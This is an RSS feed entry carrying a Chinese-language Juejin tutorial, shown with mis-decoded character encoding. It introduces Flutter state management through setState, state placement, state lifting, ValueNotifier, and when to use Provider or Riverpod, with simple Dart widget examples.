<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Flutterå­¦ä¹ ç¬”è®°â€”â€”ç¬¬äºŒç« ï¼šFlutter çŠ¶æ€ç®¡ç†å…¥é—¨]]></title>    <link>https://juejin.cn/post/7600491179499257910</link>    <guid>https://juejin.cn/post/7600491179499257910</guid>    <pubDate>2026-01-29T05:58:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600491179499257910" data-draft-id="7599511763987103798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutterå­¦ä¹ ç¬”è®°â€”â€”ç¬¬äºŒç« ï¼šFlutter çŠ¶æ€ç®¡ç†å…¥é—¨"/> <meta itemprop="keywords" content="Android,Flutter"/> <meta itemprop="datePublished" content="2026-01-29T05:58:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‚å®¿å››å—æ²³ä¸‰"/> <meta itemprop="url" content="https://juejin.cn/user/3479267728427543"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutterå­¦ä¹ ç¬”è®°â€”â€”ç¬¬äºŒç« ï¼šFlutter çŠ¶æ€ç®¡ç†å…¥é—¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3479267728427543/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‚å®¿å››å—æ²³ä¸‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T05:58:35.000Z" title="Thu Jan 29 2026 05:58:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å·²ç»å­¦ä¹ Flutterä¸€æ®µæ—¶é—´å†…ï¼Œå¯èƒ½å¤§å®¶éƒ½å·²ç»é‡åˆ°è¿‡è¿™äº›å›°æƒ‘ï¼š</p>
<ul>
<li>è¿™ä¸ªå˜é‡è¯¥å†™åœ¨å“ªä¸ª Widget é‡Œï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆæ”¹äº†æ•°æ®ï¼ŒUI æ²¡åˆ·æ–°ï¼Ÿ</li>
<li>setState è¶Šå†™è¶Šä¹±ï¼Œé¡µé¢è¶Šæ¥è¶Šå¤§</li>
<li>åˆ«äººè¯´è¦ç”¨ Provider / Riverpodï¼Œä½†æˆ‘æ ¹æœ¬ä¸çŸ¥é“ä¸ºå•¥</li>
</ul>
<p><strong>è¿™ç¯‡æ–‡ç« åªå¹²ä¸€ä»¶äº‹ï¼š</strong> æŠŠã€ŒçŠ¶æ€ç®¡ç†ã€è¿™ä»¶äº‹ï¼Œç”¨å°½å¯èƒ½é€šä¿—çš„è¯­è¨€è®²æ¸…æ¥š</p>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯çŠ¶æ€ï¼ˆStateï¼‰ï¼Ÿ</h2>
<h3 data-id="heading-1">ä¸€å¥è¯å®šä¹‰</h3>
<blockquote>
<p><strong>çŠ¶æ€ = ä¼šå½±å“ UI æ˜¾ç¤ºã€å¹¶ä¸”å¯èƒ½å‘ç”Ÿå˜åŒ–çš„æ•°æ®</strong></p>
</blockquote>
<h3 data-id="heading-2">å¸¸è§çŠ¶æ€ä¸¾ä¾‹</h3>
<ul>
<li>è®¡æ•°å™¨é‡Œçš„ <code>count</code></li>
<li>æ˜¯å¦ loading</li>
<li>åˆ—è¡¨æ•°æ®</li>
<li>æ˜¯å¦ç™»å½•</li>
<li>Tab å½“å‰é€‰ä¸­é¡¹</li>
<li>è¡¨å•è¾“å…¥å†…å®¹</li>
</ul>
<p><strong>ä¸€å¥è¯åˆ¤æ–­ï¼š</strong></p>
<blockquote>
<p>ğŸ‘‰ æ”¹äº†è¿™ä¸ªå˜é‡ï¼ŒUI è¦ä¸è¦è·Ÿç€å˜ï¼Ÿ<br/>
ğŸ‘‰ è¦ â†’ å®ƒå°±æ˜¯çŠ¶æ€</p>
</blockquote>
<p><strong>è¡¥å……ä¸¤ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li>æœ‰äº›â€œä¸ä¼šå˜â€çš„æ•°æ®ä¹Ÿä¼šå½±å“ UIï¼ˆæ¯”å¦‚é™æ€é…ç½®ï¼‰ï¼Œä½†é€šå¸¸æˆ‘ä»¬ä¸æŠŠå®ƒä»¬å«â€œçŠ¶æ€â€ï¼Œè€Œæ˜¯æŠŠâ€œä¼šå˜åŒ–â€çš„é‚£éƒ¨åˆ†æŠ½å‡ºæ¥ä½œä¸ºçŠ¶æ€ã€‚</li>
<li>çŠ¶æ€ä¸ä»…å¯ä»¥æ˜¯ç®€å•å˜é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€æ•´ä¸ªå¯¹è±¡ï¼ˆæ¯”å¦‚Â <code>User</code>ã€<code>Cart</code>ï¼‰ç”šè‡³ä¸€ä¸ªåˆ—è¡¨ã€Mapã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€ä¸ºä»€ä¹ˆ Flutter ä¸€å®šè¦â€œç®¡ç†çŠ¶æ€â€ï¼Ÿ</h2>
<p>Flutter æ˜¯<strong>å£°æ˜å¼ UI</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">UI</span> = f(state)
</code></pre>
<p>æ„æ€æ˜¯ï¼š</p>
<ul>
<li>UI <strong>å®Œå…¨ç”±çŠ¶æ€å†³å®šï¼ˆè¿™é‡Œæ’é™¤ç³»ç»Ÿä¸»é¢˜ã€è¯­è¨€åˆ‡æ¢ã€å±å¹•å°ºå¯¸å˜åŒ–ï¼‰</strong></li>
<li>çŠ¶æ€ä¸€å˜ â†’ UI é‡æ–°æè¿°ï¼ˆbuildï¼‰</li>
</ul>
<p>ğŸ‘‰ <strong>Flutter ä¸å…³å¿ƒä½ æ€ä¹ˆæ”¹çŠ¶æ€ï¼Œåªå…³å¿ƒä½ æœ‰æ²¡æœ‰å‘Šè¯‰å®ƒï¼šæˆ‘å˜äº†</strong></p>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€æœ€åŸºç¡€çš„çŠ¶æ€ç®¡ç†ï¼šsetState</h2>
<h3 data-id="heading-5">1ï¸âƒ£ æœ€ç®€å•çš„è®¡æ•°å™¨</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Counter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  const <span class="hljs-type">Counter</span>({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">State</span>&lt;<span class="hljs-type">Counter</span>&gt; createState() =&gt; _CounterState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_CounterState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State&lt;Counter&gt;</span> </span>{
  int count = <span class="hljs-number">0</span>;

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">return</span> <span class="hljs-type">Column</span>(
      children: [
        <span class="hljs-type">Text</span>('å½“å‰å€¼ï¼š$count'),
        <span class="hljs-type">ElevatedButton</span>(
          onPressed: () {
            setState(() {
              count++;
            });
          },
          child: const <span class="hljs-type">Text</span>('åŠ  <span class="hljs-number">1</span>'),
        ),
      ],
    );
  }
}
</code></pre>
<p>ä½†çœŸå®é¡¹ç›®çš„é—®é¢˜æ˜¯ï¼š</p>
<blockquote>
<p>ğŸ‘‰ è¿™ä¸ª <code>count</code> åº”è¯¥æ”¾åœ¨è¿™é‡Œå—ï¼Ÿ</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">å››ã€çŠ¶æ€åˆ°åº•è¯¥æ”¾å“ªï¼Ÿï¼ˆæ ¸å¿ƒé—®é¢˜ï¼‰</h2>
<h3 data-id="heading-7">è®°ä½è¿™ä¸€æ¡åŸºæœ¬åŸåˆ™ï¼ˆéå¸¸é‡è¦ï¼‰</h3>
<blockquote>
<p><strong>çŠ¶æ€åº”è¯¥æ”¾åœ¨â€œæœ€å°ä½†è¶³å¤Ÿâ€çš„ Widget é‡Œ</strong></p>
</blockquote>
<p>æˆ‘ä»¬æ¥çœ‹ä¸¤ä¸ªä¾‹å­</p>
<h3 data-id="heading-8">é”™è¯¯ç¤ºä¾‹ 1ï¼šçŠ¶æ€æ”¾å¤ªé«˜ï¼ˆæ–°æ‰‹æœ€å¸¸çŠ¯ï¼‰</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  const <span class="hljs-type">HomePage</span>({<span class="hljs-keyword">super</span>.key});
  <span class="hljs-meta">@override</span>
  <span class="hljs-type">State</span>&lt;<span class="hljs-type">HomePage</span>&gt; createState() =&gt; _HomePageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_HomePageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State&lt;HomePage&gt;</span> </span>{
  int count = <span class="hljs-number">0</span>;

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">return</span> <span class="hljs-type">Column</span>(
      children: [
        <span class="hljs-type">Header</span>(),
        <span class="hljs-type">Text</span>('count: $count'),
        <span class="hljs-type">Footer</span>(
          onAdd: () {
            setState(() {
              count++;
            });
          },
        ),
      ],
    );
  }
}
</code></pre>
<p>âŒ é—®é¢˜ï¼š</p>
<ul>
<li>Headerã€Footer æ˜æ˜ä¸å…³å¿ƒÂ <code>count</code>ï¼Œå´è·Ÿç€ä¸€èµ·é‡å»ºï¼ˆæ²¡å¿…è¦ï¼‰ã€‚</li>
<li>é¡µé¢é€»è¾‘å’ŒçŠ¶æ€éƒ½å †åœ¨æœ€é¡¶å±‚ï¼Œè¶Šå†™è¶Šéš¾ç»´æŠ¤ã€‚</li>
<li>åœ¨å¤æ‚é¡µé¢é‡Œï¼Œè¿™ç§â€œçŠ¶æ€æ”¾å¤ªé«˜â€çš„å†™æ³•ï¼Œå¯èƒ½å¸¦æ¥ä¸å¿…è¦çš„é‡å»ºå’Œæ€§èƒ½å¼€é”€ï¼ˆæœ¬ä¾‹æ¯”è¾ƒç®€å•ï¼Œæ€§èƒ½å·®è·æå°ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-9">è§£å†³æ–¹æ¡ˆï¼šæŠŠçŠ¶æ€äº¤ç»™çœŸæ­£éœ€è¦å®ƒçš„ç»„ä»¶ï¼ŒçŠ¶æ€ä¸‹æ²‰ï¼ˆå±€éƒ¨ Statefulï¼‰</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Counter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  const <span class="hljs-type">Counter</span>({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">State</span>&lt;<span class="hljs-type">Counter</span>&gt; createState() =&gt; _CounterState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_CounterState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State&lt;Counter&gt;</span> </span>{
  int count = <span class="hljs-number">0</span>;

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">return</span> <span class="hljs-type">Row</span>(
      children: [
        <span class="hljs-type">Text</span>('$count'),
        <span class="hljs-type">IconButton</span>(
          icon: const <span class="hljs-type">Icon</span>(<span class="hljs-type">Icons</span>.add),
          onPressed: () {
            setState(() {
              count++;
            });
          },
        ),
      ],
    );
  }
}
</code></pre>
<p>ç„¶ååœ¨é¡µé¢ä¸­ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Column</span>(
  children: const [
    Header(),
    <span class="hljs-built_in">Counter</span>(),
    <span class="hljs-selector-tag">Footer</span>(),
  ],
)
</code></pre>
<p>ğŸ‘‰ <strong>è°ç”¨çŠ¶æ€ï¼ŒçŠ¶æ€å°±æ”¾è°é‚£</strong></p>
<hr/>
<h3 data-id="heading-10">é—®é¢˜æ¥äº†ï¼šå¤šä¸ª Widget è¦ç”¨åŒä¸€ä¸ªçŠ¶æ€æ€ä¹ˆåŠï¼Ÿ</h3>
<p>åœºæ™¯ï¼šå•†å“æ•°é‡ + æ€»ä»·</p>
<pre><code class="hljs language-css" lang="css">å•†å“æ•°é‡   <span class="hljs-selector-attr">[+  -]</span>
æ€»ä»·ï¼šÂ¥ <span class="hljs-number">300</span>
</code></pre>
<p>ğŸ‘‰ æ•°é‡å’Œæ€»ä»· <strong>éƒ½ä¾èµ– count</strong></p>
<h3 data-id="heading-11">çŠ¶æ€æå‡ï¼ˆState Liftingï¼‰â€”â€” éå¸¸é‡è¦çš„æ€æƒ³</h3>
<p>æ ¸å¿ƒæ€æƒ³</p>
<blockquote>
<p><strong>å¤šä¸ªå­ç»„ä»¶å…±äº«çŠ¶æ€ â†’ çŠ¶æ€æå‡åˆ°å®ƒä»¬çš„æœ€è¿‘å…¬å…±çˆ¶ç»„ä»¶</strong></p>
</blockquote>
<h3 data-id="heading-12">ç¤ºä¾‹</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CartPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-type">State</span>&lt;<span class="hljs-type">CartPage</span>&gt; createState() =&gt; _CartPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_CartPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State&lt;CartPage&gt;</span> </span>{
  int count = <span class="hljs-number">1</span>;

  void increment() {
    setState(() {
      count++;
    });
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">return</span> <span class="hljs-type">Column</span>(
      children: [
        <span class="hljs-type">Counter</span>(count: count, onAdd: increment),
        <span class="hljs-type">TotalPrice</span>(count: count),
      ],
    );
  }
}
</code></pre>
<p>å­ç»„ä»¶å˜æˆ <strong>çº¯å±•ç¤ºç»„ä»¶</strong>ï¼š</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Counter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> int count;
  <span class="hljs-keyword">final</span> <span class="hljs-type">VoidCallback</span> onAdd;

  const <span class="hljs-type">Counter</span>({
    <span class="hljs-keyword">super</span>.key,
    required <span class="hljs-keyword">this</span>.count,
    required <span class="hljs-keyword">this</span>.onAdd,
  });

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">return</span> <span class="hljs-type">Row</span>(
      children: [
        <span class="hljs-type">Text</span>('$count'),
        <span class="hljs-type">IconButton</span>(onPressed: onAdd, icon: <span class="hljs-type">Icon</span>(<span class="hljs-type">Icons</span>.add)),
      ],
    );
  }
}
</code></pre>
<p>ğŸ‘‰ <strong>çˆ¶ç®¡çŠ¶æ€ï¼Œå­ç®¡å±•ç¤º</strong></p>
<hr/>
<h2 data-id="heading-13">äº”ã€ä»€ä¹ˆæ—¶å€™ setState å¼€å§‹ä¸å¤Ÿç”¨äº†ï¼Ÿ</h2>
<h3 data-id="heading-14">å‡ºç°è¿™äº›ä¿¡å·ï¼Œå°±è¯¥è­¦æƒ•äº†ï¼š</h3>
<ul>
<li>çŠ¶æ€åœ¨å¤šä¸ªé¡µé¢ç”¨</li>
<li>éœ€è¦è·¨è·¯ç”±è®¿é—®çŠ¶æ€</li>
<li>å‚æ•°ä¸€å±‚ä¸€å±‚å¾€ä¸‹ä¼ ï¼ˆprops drillingï¼‰</li>
<li>ä¸€ä¸ªé¡µé¢å‡ åä¸ª setState</li>
</ul>
<pre><code class="hljs language-css" lang="css">Home
 â””â”€ <span class="hljs-selector-tag">A</span>
    â””â”€ <span class="hljs-selector-tag">B</span>
       â””â”€ C
          â””â”€ Dï¼ˆè¦ç”¨çŠ¶æ€ï¼‰
</code></pre>
<p>ğŸ‘‰ ä½ ä¼šå¼€å§‹è§‰å¾— <strong>â€œä¼ å‚æ•°å¥½çƒ¦â€</strong>ï¼Œè¿™ä¸ªé—®é¢˜è‚¯å®šå›°æ‰°æˆ‘ç­‰å°ç™½ï¼Œåˆ«ç€æ€¥ï¼Œæ¥ç€çœ‹ã€‚</p>
<hr/>
<h2 data-id="heading-15">å…­ã€çŠ¶æ€çš„ä¸‰ç§å¸¸è§å±‚çº§ï¼ˆä¸€å®šè¦åˆ†æ¸…ï¼‰</h2>
<h3 data-id="heading-16">1ï¸âƒ£ UI çŠ¶æ€ï¼ˆæœ€ç®€å•ï¼‰</h3>
<ul>
<li>é€šå¸¸æŒ‡â€œåªè·ŸæŸä¸ªå°éƒ¨ä»¶ç›¸å…³çš„ã€çŸ­ç”Ÿå‘½å‘¨æœŸâ€çš„çŠ¶æ€ï¼Œ</li>
<li>æ¯”å¦‚ï¼š
<ul>
<li>åˆ—è¡¨å±•å¼€/æ”¶èµ·ã€</li>
<li>å½“å‰é€‰ä¸­çš„ tab indexã€</li>
<li>ä¸€ä¸ªæŒ‰é’®çš„ loading çŠ¶æ€ã€‚</li>
<li>åˆ‡æ¢æŒ‰é’®</li>
</ul>
</li>
</ul>
<p>ğŸ‘‰ <strong>setState è¶³å¤Ÿ</strong></p>
<hr/>
<h3 data-id="heading-17">2ï¸âƒ£ é¡µé¢çŠ¶æ€</h3>
<p>å¦‚æœåªæ˜¯è¿™ä¸ªé¡µé¢è‡ªå·±ç”¨ï¼Œæ”¾åœ¨è¿™ä¸ªé¡µé¢çš„Â <code>State</code>Â é‡Œå°±å¤Ÿäº†ã€‚ å¦‚æœé¡µé¢æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥æŠŠçŠ¶æ€å’Œé€»è¾‘æŠ½åˆ°ä¸€ä¸ªÂ <code>ChangeNotifier</code>Â æˆ–ç‹¬ç«‹çš„ç±»é‡Œï¼Œå†é€šè¿‡ Provider ç­‰æ–¹å¼æä¾›ç»™è¿™ä¸ªé¡µé¢ã€‚</p>
<ul>
<li>åˆ—è¡¨æ•°æ®</li>
<li>è¯·æ±‚ç»“æœ</li>
<li>è¡¨å•å†…å®¹</li>
</ul>
<p>ğŸ‘‰ <strong>setState / FutureBuilder / ValueNotifier</strong></p>
<hr/>
<h3 data-id="heading-18">3ï¸âƒ£ å…¨å±€çŠ¶æ€</h3>
<ul>
<li>ç™»å½•ç”¨æˆ·ä¿¡æ¯</li>
<li>ä¸»é¢˜æ¨¡å¼</li>
<li>è´­ç‰©è½¦æ•°é‡</li>
</ul>
<p>ğŸ‘‰ <strong>çŠ¶æ€ç®¡ç†åº“ç™»åœº</strong></p>
<hr/>

























<table><thead><tr><th><strong>çŠ¶æ€ç±»å‹</strong></th><th><strong>ä¸¾ä¾‹</strong></th><th><strong>å¤„ç†ç­–ç•¥</strong></th></tr></thead><tbody><tr><td><strong>UI çŠ¶æ€</strong></td><td>åŠ è½½ä¸­ï¼ˆLoadingï¼‰ã€é”™è¯¯æç¤º</td><td>ç•™åœ¨å½“å‰ Widget å†…éƒ¨å¤„ç†ã€‚</td></tr><tr><td><strong>é¡µé¢çŠ¶æ€</strong></td><td>è¯¦æƒ…é¡µæ•°æ®ã€åˆ—è¡¨æ•°æ®ã€è¡¨å•å†…å®¹</td><td>æ”¾åœ¨ <code>StatefulWidget</code> æˆ–<code>ChangeNotifier</code>ä¸­ã€‚</td></tr><tr><td><strong>å…¨å±€çŠ¶æ€</strong></td><td>ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€ä¸»é¢˜ã€è¯­è¨€</td><td>æ”¾åœ¨é¡¶å±‚ï¼Œé€šè¿‡ <code>InheritedWidget</code> å…±äº«ã€‚æˆ–å„ç§ç¬¬ä¸‰æ–¹çŠ¶æ€åº“</td></tr></tbody></table>
<h2 data-id="heading-19">ä¸ƒã€ä¸€ä¸ªâ€œä¸­é—´æ€â€çš„å¥½å·¥å…·ï¼šValueNotifier</h2>
<p>åœ¨ä½ è¿˜æ²¡ç”¨ Provider ä¹‹å‰ï¼Œ<strong>å®ƒéå¸¸å¥½ç”¨</strong>ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">final <span class="hljs-attr">counter</span> = ValueNotifier&lt;int&gt;(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
</code></pre>
<p>ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">ValueListenableBuilder&lt;<span class="hljs-built_in">int</span>&gt;(
  valueListenable: counter,
  builder: (context, value, child) {
    <span class="hljs-keyword">return</span> Text(<span class="hljs-string">'<span class="hljs-subst">$value</span>'</span>);
  },
);
</code></pre>
<p>æ›´æ–°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">counter.value++<span class="hljs-comment">;</span>
</code></pre>
<p>ğŸ‘‰ ç‰¹ç‚¹ï¼š</p>
<ul>
<li>ä¸ç”¨ setState</li>
<li>è‡ªåŠ¨å±€éƒ¨åˆ·æ–°</li>
<li>éå¸¸è½»é‡</li>
</ul>
<p>ğŸ‘‰ ä½¿ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>ç®€å•è®¡æ•°å™¨ã€å¼€å…³ï¼ˆswitchï¼‰ã€å½“å‰ index ç­‰ï¼›</li>
<li>åœ¨ä¸æƒ³å¼•å…¥æ•´ä¸ªçŠ¶æ€ç®¡ç†åº“æ—¶ï¼Œåš<strong>å±€éƒ¨å“åº”å¼æ›´æ–°</strong>ï¼›</li>
<li>å¸¸è§äºÂ <code>TextEditingController</code>Â å†…éƒ¨å°±æ˜¯ç”¨Â <code>ValueNotifier</code>Â å®ç°çš„ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-20">å…«ã€ ä»€ä¹ˆæ—¶å€™ä½ éœ€è¦ Provider / Riverpodï¼Ÿ</h2>
<p>å¾ˆå¤šäººä¸€ä¸Šæ‰‹å°±ç”¨ Providerï¼Œå…¶å®å¹¶ä¸ä¸€å®šç†è§£å®ƒè§£å†³äº†ä»€ä¹ˆã€‚
å®ƒæä¾›äº†ä¸¤ä¸ªæ ¸å¿ƒèƒ½åŠ›ï¼š</p>
<ol>
<li><strong>ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰</strong> ï¼šè®©ä»»ä½•å­èŠ‚ç‚¹éƒ½èƒ½é€šè¿‡ <code>context.read&lt;T&gt;()</code> æ‹¿åˆ°æ•°æ®ï¼Œä¸ç”¨ä¸€å±‚å±‚ä¼ å‚æ•°ã€‚</li>
<li><strong>ç²¾å‡†é€šçŸ¥</strong>ï¼šåªæœ‰ç›‘å¬äº†ç‰¹å®šæ•°æ®çš„ç»„ä»¶æ‰ä¼šåˆ·æ–°ï¼Œæ€§èƒ½æ›´ä¼˜ã€‚</li>
</ol>
<blockquote>
<p><strong>å®ƒä»¬è§£å†³çš„æ˜¯â€œçŠ¶æ€çš„å­˜æ”¾ä½ç½®â€å’Œâ€œè®¿é—®æ–¹å¼â€é—®é¢˜</strong></p>
</blockquote>
